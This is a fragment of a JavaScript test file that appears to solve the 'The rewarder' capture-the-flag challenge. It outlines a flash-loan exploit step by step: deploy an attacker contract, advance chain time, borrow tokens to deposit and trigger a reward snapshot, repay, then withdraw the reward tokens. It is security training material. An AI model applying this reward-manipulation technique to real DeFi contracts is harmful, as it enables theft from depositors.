...
describe("[Challenge] The rewarder", function () {
  ...
  it("Exploit", async function () {
     ...
     * 2. time travel
     * 3. get flash loan
     * 4. call deposit -> distributeRewards -> this will call_recordSnapshot too
     * 5. pay back the loan
     * 6. withdraw reward token to attacker
     */

    // step 1
    const TheRewardAttacker = await ethers.getContractFactory(
      "TheRewardAttacker",
      attacker
    );
    this.rewardAttacker = await TheRewardAttacker.deploy(
      this.flashLoanPool.address,
      this.liquidityToken.address,
    ...
    // step 2: Advance time 5 days so that depositors can get rewards
    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
    // step 3-5
    await this.rewardAttacker.attack(TOKENS_IN_LENDER_POOL);
    // step 6
    const amount = await this.rewardToken.balanceOf(
      this.rewardAttacker.address
    );
    await this.rewardAttacker.withdrawRewardToken(attacker.address, amount);
  });
